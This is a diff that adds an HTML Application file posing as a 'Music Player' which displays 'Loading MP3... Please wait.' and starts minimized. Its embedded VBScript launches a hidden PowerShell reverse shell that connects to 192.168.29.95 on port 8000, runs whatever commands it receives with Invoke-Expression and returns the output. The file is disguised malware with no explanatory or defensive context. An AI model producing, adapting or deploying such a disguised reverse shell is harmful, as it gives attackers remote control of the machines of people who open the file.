@@ -1,0 +1,33 @@
+<html>
+<head>
+  <title>Music Player</title>
+  <HTA:APPLICATION 
+    ID="mp3player"
+    APPLICATIONNAME="Player"
+    BORDER="thin"
+    BORDERSTYLE="complex"
+    CAPTION="yes"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    SYSMENU="yes"
+    WINDOWSTATE="minimize">
+</head>
+
+<script language="VBScript">
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "powershell -WindowStyle Hidden -Command " & Chr(34) & _
+    "$client = New-Object System.Net.Sockets.TcpClient('192.168.29.95', 8000); " & _
+    "$stream = $client.GetStream(); " & _
+    "$buffer = New-Object byte[] 1024; " & _
+    "while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { " & _
+    "$data = ([System.Text.Encoding]::UTF8).GetString($buffer, 0, $i); " & _
+    "$result = try { Invoke-Expression $data 2>&1 | Out-String } catch { $_.Exception.Message }; " & _
+    "$send = [System.Text.Encoding]::UTF8.GetBytes($result); " & _
+    "$stream.Write($send, 0, $send.Length) }; " & _
+    "$client.Close()" & Chr(34), 0, False
+</script>
+
+<body>
+    <p>Loading MP3... Please wait.</p>
+</body>
+</html>
